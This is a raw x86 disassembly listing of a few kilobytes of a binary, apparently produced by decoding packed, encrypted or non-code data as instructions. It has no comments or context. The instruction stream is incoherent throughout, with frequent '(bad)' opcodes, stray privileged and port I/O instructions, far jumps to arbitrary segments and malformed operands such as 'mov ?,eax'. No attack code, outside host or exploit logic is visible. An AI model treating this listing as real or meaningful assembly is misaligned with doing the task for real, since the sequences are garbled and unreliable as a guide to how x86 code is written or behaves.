  4223c6:	inc    ecx
  4223c7:	xlat   BYTE PTR ds:[ebx]
  4223c8:	ret    
  4223c9:	cld    
  4223ca:	sub    BYTE PTR [ecx-0x7e546cbe],bh
  4223d0:	clc    
  4223d1:	inc    ebx
  4223d2:	in     eax,0x22
  4223d4:	pop    ecx
  4223d5:	retf   
  4223d6:	ret    
  4223d7:	sti    
  4223d8:	mov    eax,ds:0xfeb07ea4
  4223dd:	mov    ?,eax
  4223df:	jno    0x42239c
  4223e1:	dec    ebx
  4223e2:	sbb    al,bh
  4223e4:	pop    ss
  4223e5:	lods   eax,DWORD PTR ds:[esi]
  4223e7:	stos   DWORD PTR es:[edi],eax
  4223e8:	into   
  4223e9:	sbb    BYTE PTR [eax],0xd8
  4223ec:	fcmovnb st,st(7)
  4223ee:	mov    cl,0x78
  4223f0:	dec    ebx
  4223f1:	inc    ebp
  4223f2:	inc    eax
  4223f3:	popf   
  4223f4:	(bad)  
  4223f5:	mov    eax,ds:0xb4d5d150
  4223fa:	(bad)  
  4223fb:	in     eax,0x17
  4223fd:	rol    dh,0x3d
  422400:	lea    ebx,[edi+esi*1-0x5350c1dd]
  422407:	das    
  422408:	pop    ds
  422409:	mov    al,ds:0x5a5cfda1
  42240e:	in     al,0x5d
  422410:	xor    BYTE PTR [edx-0x154e9bb0],cl
  422416:	in     al,dx
  422417:	sub    BYTE PTR [edi+0x3e8d68a1],cl
  42241d:	add    al,cl
  42241f:	popf   
  422420:	xlat   BYTE PTR ds:[ebx]
  422421:	outs   dx,BYTE PTR ds:[esi]
  422422:	and    bh,BYTE PTR [esi+0x45]
  422425:	gs cld 
  422427:	loop   0x422477
  422429:	jecxz  0x42247c
  42242b:	xchg   ecx,eax
  42242c:	adc    ebp,edi
  42242e:	idiv   edx
  422430:	sbb    al,0x5e
  422432:	or     al,0x2f
  422434:	scas   eax,DWORD PTR es:[edi]
  422435:	push   cs
  422436:	xchg   ecx,eax
  422437:	mov    esp,0xe6bacd24
  42243c:	repnz inc ecx
  42243e:	sti    
  42243f:	inc    edx
  422440:	mov    bl,0xf0
  422442:	das    
  422443:	cmp    eax,0xebd6dcc7
  422448:	nop
  422449:	sahf   
  42244a:	popa   
  42244b:	in     al,dx
  42244c:	ret    
  42244d:	int3   
  42244e:	pop    ds
  42244f:	and    al,0xc6
  422451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422452:	fisttp DWORD PTR [ebx+0x5f2f0a7b]
  422458:	push   0x59f909d5
  42245d:	retf   0x1e39
  422460:	push   ebx
  422461:	jae    0x422459
  422463:	sbb    esi,DWORD PTR [ecx+edi*2-0x6a188b75]
  42246a:	fsub   DWORD PTR [ebp+0x2e]
  42246d:	cmp    al,0x4f
  42246f:	cmp    eax,DWORD PTR [ebx+0x4e]
  422472:	push   esi
  422473:	test   al,0x7b
  422475:	pop    ebp
  422476:	ficom  WORD PTR [ebp+edx*8-0x52e77fed]
  42247d:	pusha  
  42247e:	or     edi,DWORD PTR [esi+edi*4-0x5c3c8a03]
  422485:	fsubr  DWORD PTR [edi+0x5325a13c]
  42248b:	jne    0x4224f1
  42248d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248e:	and    BYTE PTR [ecx+0x39],dl
  422491:	mov    al,ds:0x2dfd0623
  422496:	dec    edx
  422497:	add    eax,0xd79cbf0
  42249c:	fs jmp 0xe214ee13
  4224a2:	sar    BYTE PTR [ecx+0x21973815],1
  4224a8:	aam    0xc1
  4224aa:	sub    eax,0x98252d29
  4224af:	cli    
  4224b0:	dec    eax
  4224b1:	inc    edi
  4224b2:	ds (bad) 
  4224b4:	jg     0x42247d
  4224b6:	dec    ecx
  4224b7:	inc    esi
  4224b8:	sub    al,0xd0
  4224ba:	bound  edx,QWORD PTR [edi+0x1e]
  4224bd:	xor    eax,0x624c882f
  4224c2:	imul   esp,edx,0xbc7fb373
  4224c8:	add    dl,BYTE PTR [ecx-0x2e]
  4224cb:	jnp    0x4224aa
  4224cd:	das    
  4224ce:	repz jnp 0x4224dc
  4224d1:	mov    ebp,0xa42b54df
  4224d6:	test   cl,bl
  4224d8:	cmp    DWORD PTR [ebx+edx*4-0x2544ddd5],eax
  4224df:	add    al,0xb8
  4224e1:	scas   al,BYTE PTR es:[edi]
  4224e2:	dec    esi
  4224e3:	sbb    edx,0x3e37c6c6
  4224e9:	pop    ds
  4224ea:	popa   
  4224eb:	sbb    eax,0x26d7e75
  4224f0:	clc    
  4224f1:	jle    0x42247d
  4224f3:	mov    dh,0x51
  4224f5:	push   eax
  4224f6:	jecxz  0x42249e
  4224f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f9:	out    dx,al
  4224fa:	sub    bh,BYTE PTR [eax]
  4224fc:	xor    al,dh
  4224fe:	dec    esp
  4224ff:	sbb    ah,bl
  422501:	into   
  422502:	mov    ah,0x71
  422504:	add    esi,0xffffffa7
  422507:	pop    edx
  422508:	ret    0x8a76
  42250b:	dec    ebx
  42250c:	aam    0x65
  42250e:	mov    ?,WORD PTR [ecx+0x3793e7e7]
  422514:	mov    esp,0xb728da
  422519:	scas   al,BYTE PTR es:[edi]
  42251a:	cmp    BYTE PTR ds:0xa4096156,dl
  422520:	stos   DWORD PTR es:[edi],eax
  422521:	mov    DWORD PTR [esi],esi
  422523:	(bad)  
  422524:	mov    dh,0x4
  422526:	frstor [edi-0x45913654]
  42252c:	dec    edi
  42252d:	sbb    ebp,DWORD PTR [edi]
  42252f:	cwde   
  422530:	dec    edx
  422531:	loope  0x422505
  422533:	push   ecx
  422534:	sub    DWORD PTR [ecx-0xd],edi
  422537:	or     eax,0xd8326c0f
  42253c:	fwait
  42253d:	sbb    edx,ebx
  42253f:	mov    ah,0xa7
  422541:	sbb    ch,BYTE PTR [ecx-0x1707428a]
  422547:	aam    0x65
  422549:	lea    eax,[esi+0x472ddae1]
  42254f:	test   al,0xe4
  422551:	imul   edx,edi,0xa2c60911
  422557:	jle    0x422581
  422559:	je     0x422545
  42255b:	pop    edx
  42255c:	retf   0x5d79
  42255f:	jecxz  0x422552
  422561:	ins    DWORD PTR es:[edi],dx
  422562:	pop    edi
  422563:	sub    edx,edi
  422565:	inc    ecx
  422566:	pop    ds
  422567:	stos   BYTE PTR es:[edi],al
  422568:	push   eax
  422569:	mov    eax,ds:0x6ea1d33f
  42256e:	and    DWORD PTR [ebp+0x21],ebp
  422571:	lds    esp,FWORD PTR [edx+0x69]
  422574:	mov    edi,0xb447411f
  422579:	fist   WORD PTR [ebx+0x52]
  42257c:	or     BYTE PTR [esi+0x6dbc6bbf],ch
  422582:	sbb    eax,0xaf38bb96
  422587:	jb     0x42257a
  422589:	stos   DWORD PTR es:[edi],eax
  42258a:	lea    esi,[esi+eax*2-0x2f]
  42258e:	fwait
  42258f:	repz mov edx,0x4954634c
  422595:	retf   0xd47
  422598:	out    0x6a,eax
  42259a:	mov    al,0x75
  42259c:	mov    dl,0xd1
  42259e:	rcl    DWORD PTR [edx+0x43e04f84],1
  4225a4:	sbb    BYTE PTR [edi],ch
  4225a6:	mov    bh,0x13
  4225a8:	shr    DWORD PTR fs:[edx-0x33],cl
  4225ac:	add    BYTE PTR [ebx],0xab
  4225af:	out    dx,al
  4225b0:	jb     0x4225da
  4225b2:	and    dh,BYTE PTR [ecx]
  4225b4:	loopne 0x4225af
  4225b6:	vaddpd ymm3,ymm4,YMMWORD PTR [edx-0x66]
  4225bb:	iret   
  4225bc:	jge    0x4225bd
  4225be:	cmpps  xmm4,XMMWORD PTR [ecx],0x4f
  4225c2:	push   es
  4225c3:	(bad)  
  4225c4:	jmp    0x4225bd
  4225c6:	(bad)  
  4225c7:	stc    
  4225c8:	ret    
  4225c9:	aaa    
  4225ca:	push   ebx
  4225cb:	and    edi,DWORD PTR [esi+0x6d0a684e]
  4225d1:	in     eax,dx
  4225d2:	xor    DWORD PTR [eax-0x60adf01c],edx
  4225d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225d9:	sar    dl,cl
  4225db:	dec    edi
  4225dc:	adc    BYTE PTR [edx-0x38],ah
  4225df:	mov    ch,0xa4
  4225e1:	test   BYTE PTR [ebp+0x3d859762],0xb7
  4225e8:	iret   
  4225e9:	mov    WORD PTR [eax+0x3bfb8471],cs
  4225ef:	shr    bh,0x8a
  4225f2:	xor    BYTE PTR [ecx],ah
  4225f4:	pushf  
  4225f5:	inc    ebx
  4225f6:	inc    esi
  4225f7:	ins    DWORD PTR es:[edi],dx
  4225f8:	push   ss
  4225f9:	loope  0x42263c
  4225fb:	outs   dx,BYTE PTR ds:[esi]
  4225fc:	mov    dh,0x42
  4225fe:	fimul  DWORD PTR [eax]
  422600:	sahf   
  422601:	aam    0x66
  422603:	scas   al,BYTE PTR es:[edi]
  422604:	test   BYTE PTR [ebx+0x372e5fec],ah
  42260a:	mov    BYTE PTR [ebx-0xe],bl
  42260d:	adc    DWORD PTR [ebx],edi
  42260f:	cld    
  422610:	add    al,0x4f
  422612:	enter  0x7529,0x88
  422616:	add    DWORD PTR [esi-0x27bf65d8],0x578d90ac
  422620:	and    esp,esi
  422622:	rol    BYTE PTR [ebp+0x73473af9],0x1f
  422629:	fisub  DWORD PTR [edx]
  42262b:	out    0xd2,eax
  42262d:	push   ebx
  42262e:	cmp    edi,DWORD PTR [ecx-0x4426cde7]
  422634:	test   ecx,ebp
  422636:	call   0x4cbd6beb
  42263b:	sbb    al,0xda
  42263d:	clc    
  42263e:	fbld   TBYTE PTR [ecx+0x70]
  422641:	sar    BYTE PTR [ecx],0x54
  422644:	cmp    DWORD PTR [esp+ecx*2],esi
  422647:	out    0xbf,al
  422649:	ror    BYTE PTR [edx+0x5299b341],1
  42264f:	bound  esp,QWORD PTR [edi+0x6f29965b]
  422655:	mov    edi,0x50370709
  42265a:	cld    
  42265b:	cmc    
  42265c:	add    DWORD PTR [ecx+ebx*2-0x1b],ecx
  422660:	mov    ecx,DWORD PTR [esi-0x41]
  422663:	push   ecx
  422664:	xchg   ebp,eax
  422665:	mov    eax,0x77a2cedd
  42266a:	pop    ebx
  42266b:	mov    ecx,0xd9c08f52
  422670:	or     DWORD PTR [ebx],esp
  422672:	cwde   
  422673:	imul   edx,DWORD PTR [ecx-0x12e135c6],0xa
  42267a:	push   0xbeb39b5c
  42267f:	inc    eax
  422680:	out    dx,eax
  422681:	stc    
  422682:	icebp  
  422683:	pop    edx
  422684:	(bad)  
  422685:	loopne 0x42263f
  422687:	lods   eax,DWORD PTR ds:[esi]
  422688:	adc    cl,dh
  42268a:	pop    es
  42268b:	ja     0x4226d9
  42268d:	rcl    dh,1
  42268f:	fisubr WORD PTR [esi+ebp*4-0x63]
  422693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422694:	scas   eax,DWORD PTR es:[edi]
  422695:	in     eax,0x88
  422697:	adc    cl,ch
  422699:	lds    esi,FWORD PTR [ecx]
  42269b:	enter  0x1f2e,0x37
  42269f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a0:	sbb    cl,BYTE PTR [esi+0x70d87029]
  4226a6:	(bad)  
  4226a7:	cmc    
  4226a8:	loope  0x4226dd
  4226aa:	fbld   TBYTE PTR [edi+0x60cb3d59]
  4226b0:	mov    ah,BYTE PTR [esi]
  4226b2:	setb   BYTE PTR ss:[ebp+eiz*4+0x157f250e]
  4226bb:	(bad)
  4226be:	dec    esi
  4226bf:	ret    
  4226c0:	or     eax,0x5a76e106
  4226c5:	sbb    DWORD PTR [esi-0x4b],0x7aed6096
  4226cc:	xor    al,0x84
  4226ce:	pop    eax
  4226cf:	rol    BYTE PTR [edi-0x762c1368],1
  4226d5:	add    edx,DWORD PTR [esi-0x13]
  4226d8:	jg     0x4226df
  4226da:	jle    0x4226cf
  4226dc:	(bad)  
  4226dd:	loop   0x422687
  4226df:	ret    0xc3db
  4226e2:	jno    0x4226a7
  4226e4:	push   eax
  4226e5:	xchg   ecx,eax
  4226e6:	in     al,0x7e
  4226e8:	(bad)  
  4226e9:	dec    ecx
  4226ea:	mov    esp,0xcb9330c0
  4226ef:	xchg   ebx,eax
  4226f0:	ret    0xd06
  4226f3:	fprem  
  4226f5:	xlat   BYTE PTR ds:[ebx]
  4226f6:	xchg   ecx,eax
  4226f7:	aas    
  4226f8:	mov    DWORD PTR [edi],edi
  4226fa:	inc    esi
  4226fb:	fmul   st,st(7)
  4226fd:	push   ebp
  4226fe:	sti    
  4226ff:	dec    edx
  422700:	hlt    
  422701:	inc    dh
  422703:	push   cs
  422704:	mov    dl,bl
  422706:	retf   0xd9c8
  422709:	cmovne esp,DWORD PTR [ebp+0x41eb827c]
  422710:	out    dx,al
  422711:	push   eax
  422712:	aad    0x74
  422714:	pop    ebx
  422715:	lahf   
  422716:	retf   0x4e46
  422719:	sub    esi,DWORD PTR [esi+0x51]
  42271c:	sub    eax,ecx
  42271e:	or     DWORD PTR [edx-0x14a2aa8],eax
  422724:	ins    DWORD PTR es:[edi],dx
  422725:	pop    edx
  422726:	jmp    0x67134b1f
  42272b:	neg    ah
  42272d:	inc    ebp
  42272e:	sbb    al,0xe5
  422730:	xchg   edi,eax
  422731:	push   ecx
  422732:	hlt    
  422733:	adc    DWORD PTR [eax+0x20],ebx
  422736:	mov    esi,0x46b3f9a7
  42273b:	scas   eax,DWORD PTR es:[edi]
  42273c:	ss mov dh,0x2b
  42273f:	rcr    BYTE PTR [ebx+0x48],1
  422742:	and    bh,BYTE PTR [edx]
  422744:	sub    eax,0x2c616a0a
  422749:	ss call 0x40d96afb
  42274f:	lods   al,BYTE PTR ds:[esi]
  422750:	pop    ebp
  422751:	adc    ebp,DWORD PTR ds:0xdf73656c
  422757:	cmp    al,0xb8
  422759:	inc    ebp
  42275a:	and    ch,BYTE PTR [ecx-0x4b6f7e63]
  422760:	mov    bl,0xf0
  422762:	push   edi
  422763:	dec    esi
  422764:	or     al,0x2c
  422766:	iret   
  422767:	xchg   edx,eax
  422768:	stos   BYTE PTR es:[edi],al
  422769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42276a:	pop    esp
  42276b:	or     DWORD PTR [esi-0x10],esp
  42276e:	hlt    
  42276f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422770:	mov    al,ds:0x4b97d491
  422775:	mov    gs,ebx
  422777:	mov    ebp,ecx
  422779:	xlat   BYTE PTR ds:[ebx]
  42277a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42277b:	mov    WORD PTR [eax-0x5c],?
  42277e:	and    al,0xd0
  422780:	jmp    0x4227f8
  422782:	and    eax,0x1e226127
  422787:	dec    ebx
  422788:	in     al,dx
  422789:	jmp    0x5cae:0x9cba036c
  422790:	iret   
  422791:	jo     0x4227c1
  422793:	int    0x88
  422795:	das    
  422796:	mov    eax,ds:0xbd59d185
  42279b:	hlt    
  42279c:	cmp    BYTE PTR [edx],dl
  42279e:	jo     0x42281c
  4227a0:	cmc    
  4227a1:	sub    ah,BYTE PTR [edi+0x5c]
  4227a4:	jmp    0x870:0x7a90e7ce
  4227ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227ac:	(bad)
  4227af:	int3   
  4227b0:	out    dx,eax
  4227b1:	js     0x422819
  4227b3:	rcl    bl,0xad
  4227b6:	xchg   esp,eax
  4227b7:	movd   mm1,edx
  4227ba:	lods   al,BYTE PTR ds:[esi]
  4227bb:	retf   
  4227bc:	icebp  
  4227bd:	inc    edx
  4227be:	and    al,BYTE PTR [edx+ebp*4-0x6f]
  4227c2:	inc    ebp
  4227c3:	out    dx,eax
  4227c4:	lds    eax,FWORD PTR [eax]
  4227c6:	dec    eax
  4227c7:	jns    0x422833
  4227c9:	jns    0x4227a0
  4227cb:	nop
  4227cc:	aas    
  4227cd:	int3   
  4227ce:	xor    DWORD PTR [edi+0x6afe5f1b],ebx
  4227d4:	dec    edx
  4227d5:	pop    ecx
  4227d6:	inc    esp
  4227d7:	cmp    al,0xa2
  4227d9:	xor    edx,DWORD PTR [ebx+0x27]
  4227dc:	out    0x10,eax
  4227de:	rcr    BYTE PTR [ebx],0x11
  4227e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227e2:	mov    dl,0xf0
  4227e4:	stos   DWORD PTR es:[edi],eax
  4227e5:	mov    fs,eax
  4227e7:	mov    DWORD PTR [esi+0x73],eax
  4227ea:	outs   dx,BYTE PTR ds:[esi]
  4227eb:	cmp    ecx,edx
  4227ed:	int3   
  4227ee:	inc    ebp
  4227ef:	(bad)  
  4227f0:	adc    ecx,ebp
  4227f2:	lea    esi,[edx-0x52]
  4227f5:	jmp    0x422803
  4227f7:	or     ecx,ebx
  4227f9:	mov    ch,BYTE PTR [eax]
  4227fb:	stc    
  4227fc:	adc    al,0xda
  4227fe:	add    eax,0xbd77eca6
  422803:	into   
  422804:	dec    ebp
  422805:	clc    
  422806:	aaa    
  422807:	test   DWORD PTR [ebx+0x42],ebx
  42280a:	jno    0x4227de
  42280c:	outs   dx,DWORD PTR ds:[esi]
  42280d:	ins    BYTE PTR es:[edi],dx
  42280e:	in     eax,0x87
  422810:	mov    ch,dl
  422812:	inc    ebx
  422813:	fwait
  422814:	shl    DWORD PTR [ecx],cl
  422816:	into   
  422817:	sub    ebx,esp
  422819:	data16 loop 0x422879
  42281c:	push   ds
  42281d:	lods   eax,DWORD PTR ds:[esi]
  42281e:	jo     0x4227b1
  422820:	xchg   DWORD PTR [esi+0x6],ebx
  422823:	pop    eax
  422824:	inc    eax
  422825:	inc    edx
  422826:	je     0x4227fc
  422828:	or     eax,0x1ef56904
  42282d:	xor    DWORD PTR [ebx+edx*1],0xaa4e8c67
  422834:	inc    eax
  422835:	sti    
  422836:	inc    esp
  422837:	sbb    eax,0xe750f499
  42283c:	ret    0xc3b9
  42283f:	or     ch,BYTE PTR [edx+0x1f]
  422842:	jno    0x42288d
  422844:	call   0x3c53b6bf
  422849:	inc    edx
  42284a:	(bad)  
  42284b:	jno    0x4228c0
  42284d:	outs   dx,BYTE PTR ds:[esi]
  42284e:	cmp    DWORD PTR [ebp-0x284fdc82],eax
  422854:	not    DWORD PTR [ebx]
  422856:	outs   dx,BYTE PTR ds:[esi]
  422857:	push   ss
  422858:	icebp  
  422859:	rol    DWORD PTR [eax],0xef
  42285c:	pop    esp
  42285d:	inc    ecx
  42285e:	neg    DWORD PTR [ecx]
  422860:	mov    eax,0xc1c0b0bd
  422865:	test   eax,0x7c1cd1e8
  42286a:	mov    BYTE PTR [eax+0x4e45571c],0x98
  422871:	add    al,0xb6
  422873:	ficomp WORD PTR [edx-0x5f]
  422876:	and    cl,dl
  422878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422879:	dec    esi
  42287a:	les    ebx,FWORD PTR [eax]
  42287c:	adc    BYTE PTR [edx-0x6ac1ccbe],bl
  422882:	push   0x3dac12e6
  422887:	inc    esp
  422888:	cdq    
  422889:	push   ecx
  42288a:	dec    ecx
  42288b:	call   0xba511673
  422890:	shl    DWORD PTR [edi+edi*4-0x3b],0x46
  422895:	jbe    0x42285c
  422897:	mov    ds:0x2827f7e8,al
  42289c:	fwait
  42289d:	adc    dh,al
  42289f:	mov    cl,0xae
  4228a1:	inc    ecx
  4228a2:	and    edi,edx
  4228a4:	ror    BYTE PTR [ebx-0x1a],0x8f
  4228a8:	mov    dh,0x1
  4228aa:	popa   
  4228ab:	(bad)  
  4228ac:	fmul   DWORD PTR [esi]
  4228ae:	mov    dh,0xfa
  4228b0:	push   ebp
  4228b1:	mov    ah,0xb9
  4228b3:	xor    ebp,DWORD PTR [edx]
  4228b5:	gs and al,0x87
  4228b8:	sbb    DWORD PTR [edx-0x1e],esi
  4228bb:	dec    ecx
  4228bc:	push   edi
  4228bd:	sbb    al,0x6c
  4228bf:	bound  ecx,QWORD PTR [ecx-0x30]
  4228c2:	cwde   
  4228c3:	sub    edx,DWORD PTR [edi]
  4228c5:	sbb    DWORD PTR [eax],edx
  4228c7:	gs sbb al,0x58
  4228ca:	and    esi,edi
  4228cc:	out    0x97,al
  4228ce:	push   esi
  4228cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228d0:	push   ebp
  4228d1:	pop    es
  4228d2:	adc    eax,0xc603a378
  4228d7:	je     0x422926
  4228d9:	mov    ecx,ecx
  4228db:	add    DWORD PTR [esi],esp
  4228dd:	xchg   edx,eax
  4228de:	jmp    0x422901
  4228e0:	jo     0x4228e7
  4228e2:	cmp    eax,0xe138b765
  4228e7:	mov    esi,0x7b8c1681
  4228ec:	mov    edx,ecx
  4228ee:	pop    edx
  4228ef:	xchg   ebp,eax
  4228f0:	add    DWORD PTR [edx-0x48dc63cd],ebp
  4228f6:	call   0x5e1b:0x77861595
  4228fd:	mov    ds:0x20c3088,eax
  422902:	call   0xd8c9:0x92bc6543
  422909:	daa    
  42290a:	mov    al,ah
  42290c:	rol    DWORD PTR [esi+ebp*8+0xc],cl
  422910:	mov    dl,0x90
  422912:	mov    ah,0xb3
  422914:	fsubr  QWORD PTR [edi]
  422916:	(bad)  
  422917:	loopne 0x4228e1
  422919:	repnz fisub DWORD PTR [edx+0x8]
  42291d:	mov    eax,ds:0xc858668d
  422922:	mov    ecx,0x153ba9ad
  422927:	(bad)  
  422928:	sti    
  422929:	retf   0x7b6f
  42292c:	out    dx,eax
  42292d:	dec    ecx
  42292e:	imul   edi,ebp,0x3e5675c2
  422934:	sahf   
  422935:	xor    DWORD PTR [ecx+0x9],0xe995fe6f
  42293c:	fisub  WORD PTR [edx]
  42293e:	xchg   esp,eax
  42293f:	sbb    al,0x7f
  422941:	cs loopne 0x422970
  422944:	inc    edi
  422945:	cmp    esp,edx
  422947:	push   eax
  422948:	enter  0xf541,0x53
  42294c:	scas   eax,DWORD PTR es:[edi]
  42294d:	push   esi
  42294e:	push   ebx
  42294f:	retf   
  422950:	jne    0x422921
  422952:	and    BYTE PTR [eax],ch
  422954:	inc    edi
  422955:	bound  esi,QWORD PTR [eax-0x4c]
  422958:	xchg   esi,eax
  422959:	loope  0x4229be
  42295b:	xor    al,0x79
  42295d:	fwait
  42295e:	pop    edi
  42295f:	cmp    edi,esp
  422961:	lock add esp,DWORD PTR [ebx+0x6c9a44b9]
  422968:	aad    0x14
  42296a:	mov    eax,0x6afc173e
  42296f:	lock mov dh,BYTE PTR [esi+ebp*2-0x24bd0ee3]
  422977:	test   al,0x81
  422979:	cmp    dl,BYTE PTR [ebx+0x7f]
  42297c:	sub    DWORD PTR [ecx+ebp*4+0x4bbfbef9],0xf4b5c8fe
  422987:	push   eax
  422988:	es loop 0x42297c
  42298b:	es ret 0xf9ce
  42298f:	or     DWORD PTR [edx],esi
  422991:	and    eax,0x38069542
  422996:	xor    edx,ebp
  422998:	xchg   ecx,eax
  422999:	mov    dl,BYTE PTR [ecx+0xead35ca]
  42299f:	cwde   
  4229a0:	int3   
  4229a1:	sub    ecx,DWORD PTR [eax-0xc]
  4229a4:	retf   
  4229a5:	sbb    bl,BYTE PTR [esi+0x6a]
  4229a8:	mov    ch,0x88
  4229aa:	xlat   BYTE PTR ds:[ebx]
  4229ab:	or     BYTE PTR [esi],ch
  4229ad:	or     eax,0xec489a45
  4229b2:	call   0xb188d23b
  4229b7:	push   ebx
  4229b8:	call   0xd246f4c0
  4229bd:	or     ebx,0x8b4d79d0
  4229c3:	out    dx,eax
  4229c4:	in     al,dx
  4229c5:	inc    ebp
  4229c6:	mov    bl,0xca
  4229c8:	stos   BYTE PTR es:[edi],al
  4229c9:	std    
  4229ca:	es retf 
  4229cc:	cs ret 
  4229ce:	dec    edi
  4229cf:	arpl   WORD PTR [ecx],ax
  4229d1:	data16 and BYTE PTR ds:0x5fa5165c,cl
  4229d8:	xchg   ecx,eax
  4229d9:	fld    DWORD PTR [eax]
  4229db:	(bad)  
  4229dc:	stc    
  4229dd:	pop    es
  4229de:	clc    
  4229df:	sbb    al,0xf1
  4229e1:	iret   
  4229e2:	stos   DWORD PTR es:[edi],eax
  4229e3:	imul   edi,DWORD PTR [eax],0xd
  4229e6:	cmp    BYTE PTR [edi-0x50a724b1],bh
  4229ec:	mov    al,0xa5
  4229ee:	(bad)  
  4229ef:	int3   
  4229f0:	inc    ebp
  4229f1:	mov    dl,0x91
  4229f3:	xor    edx,DWORD PTR [ebx]
  4229f5:	xchg   ecx,eax
  4229f6:	(bad)  
  4229f7:	adc    BYTE PTR [eax],dl
  4229f9:	mov    dl,0x71
  4229fb:	icebp  
  4229fc:	mov    ebp,0xbc6cea6f
  422a01:	(bad)  
  422a02:	jmp    FWORD PTR [edx]
  422a04:	cld    
  422a05:	es mov edi,0x5ec6da72
  422a0b:	xor    dh,al
  422a0d:	mov    edx,0xaacc3c88
  422a12:	adc    eax,0x8ded2e85
  422a17:	js     0x422a6c
  422a19:	into   
  422a1a:	xor    ebp,DWORD PTR [esi-0x25]
  422a1d:	stos   BYTE PTR es:[edi],al
  422a1e:	cdq    
  422a1f:	shl    DWORD PTR [eax-0x26],0xac
  422a23:	in     al,dx
  422a24:	cli    
  422a25:	pop    edi
  422a26:	sub    BYTE PTR fs:[edx],al
  422a29:	mov    gs,WORD PTR [esi-0xf]
  422a2c:	and    esi,DWORD PTR [edi+0x4a14cefe]
  422a32:	(bad)  
  422a33:	ds sub al,0xf
  422a36:	(bad)  
  422a37:	gs sahf 
  422a39:	adc    eax,0x6fc00f6a
  422a3e:	les    ebp,FWORD PTR [esi-0x68f27d50]
  422a44:	sbb    al,0x4e
  422a46:	mov    ah,0x66
  422a48:	stos   DWORD PTR es:[edi],eax
  422a49:	(bad)  
  422a4a:	stc    
  422a4b:	xchg   bh,cl
  422a4d:	cmp    al,BYTE PTR [esi+0xc]
  422a50:	inc    esi
  422a51:	fwait
  422a52:	lea    edi,[ecx-0x7bb0f0ac]
  422a58:	hlt    
  422a59:	push   cs
  422a5a:	dec    esi
  422a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a5c:	mov    bh,0x3d
  422a5e:	psrld  mm3,QWORD PTR [ebp-0x10]
  422a62:	pop    esp
  422a63:	push   0xffffff8e
  422a65:	dec    esp
  422a66:	jbe    0x422a25
  422a68:	test   BYTE PTR [eax+0x771bb2ba],dl
  422a6e:	repz add DWORD PTR [esi-0x64fecbef],edi
  422a75:	fcmove st,st(6)
  422a77:	ja     0x422a4a
  422a79:	pop    ebx
  422a7a:	test   dh,0x45
  422a7d:	sti    
  422a7e:	ficomp DWORD PTR [ecx+0x27e18ee9]
  422a84:	sbb    ch,al
  422a86:	test   al,0x29
  422a88:	jmp    0x95138388
  422a8d:	or     esi,DWORD PTR [edx-0x6f]
  422a90:	push   ss
  422a91:	or     BYTE PTR [ebp+0x55b89805],ah
  422a97:	dec    esi
  422a98:	out    dx,eax
  422a99:	push   edx
  422a9a:	cbw    
  422a9c:	push   ecx
  422a9d:	popa   
  422a9e:	mov    ch,0x9c
  422aa0:	fisubr DWORD PTR [eax+edi*4]
  422aa3:	fwait
  422aa4:	in     al,0x81
  422aa6:	test   BYTE PTR [esi+0x2],cl
  422aa9:	add    DWORD PTR [esi+edx*1-0x54],ebp
  422aad:	adc    BYTE PTR [eax+0x43f21aab],bh
  422ab3:	imul   ebp,DWORD PTR [eax],0x50c4e0ec
  422ab9:	cli    
  422aba:	arpl   dx,dx
  422abc:	(bad)  
  422abe:	sbb    BYTE PTR [edx],bh
  422ac0:	xchg   ebx,eax
  422ac1:	push   cs
  422ac2:	or     eax,0x919576a
  422ac7:	ds sbb al,0xd6
  422aca:	dec    ecx
  422acb:	call   0xd84d:0x372aa92
  422ad2:	leave  
  422ad3:	dec    esi
  422ad4:	arpl   WORD PTR [ebx-0x2e],dx
  422ad7:	add    ah,BYTE PTR [ecx+0x5c]
  422ada:	lods   al,BYTE PTR fs:[esi]
  422adc:	mov    ah,0xde
  422ade:	fst    QWORD PTR [ebx+0x29]
  422ae1:	lds    edx,FWORD PTR [ecx-0x24472050]
  422ae7:	lods   eax,DWORD PTR ds:[esi]
  422ae8:	inc    eax
  422ae9:	sbb    eax,0xc0417776
  422aee:	jg     0x422af4
  422af0:	jno    0x422aa1
  422af2:	cdq    
  422af3:	or     dh,BYTE PTR [edx-0x65]
  422af6:	mov    DWORD PTR [edx],ecx
  422af8:	js     0x422a99
  422afa:	jo     0x422aeb
  422afc:	int3   
  422afd:	jge    0x422aca
  422aff:	fild   WORD PTR [ebp+0x8f642fc]
  422b05:	rcl    bh,1
  422b07:	xor    dl,dl
  422b09:	fistp  WORD PTR ds:0xf87f97a8
  422b0f:	jecxz  0x422abc
  422b11:	mov    edi,DWORD PTR [ebx-0x7bd8f820]
  422b17:	jle    0x422b43
  422b19:	out    dx,al
  422b1a:	sbb    dh,BYTE PTR [ebp-0x2a4bec95]
  422b20:	imul   esp,DWORD PTR [eax],0x5bf8f3c3
  422b26:	xchg   esp,eax
  422b27:	jmp    0x422ab0
  422b29:	nop
  422b2a:	shl    ebp,1
  422b2c:	or     edx,0xffffffa2
  422b2f:	jae    0x422b7a
  422b31:	mov    edx,0x22d8faf5
  422b36:	mov    bh,0x4e
  422b38:	(bad)  
  422b39:	loope  0x422ac6
  422b3b:	and    eax,0xc13e56db
  422b40:	push   edx
  422b41:	mov    cs,WORD PTR [esi-0x2d]
  422b44:	stos   DWORD PTR es:[edi],eax
  422b45:	pusha  
  422b46:	push   ds
  422b47:	cmp    DWORD PTR [edx-0x290e9c3d],edx
  422b4d:	cmp    BYTE PTR [edi],cl
  422b4f:	inc    ecx
  422b50:	not    BYTE PTR [ecx+0x38a7b732]
  422b56:	xor    esi,eax
  422b58:	mov    bh,BYTE PTR [eax-0x30bc7ec8]
  422b5e:	gs inc ebx
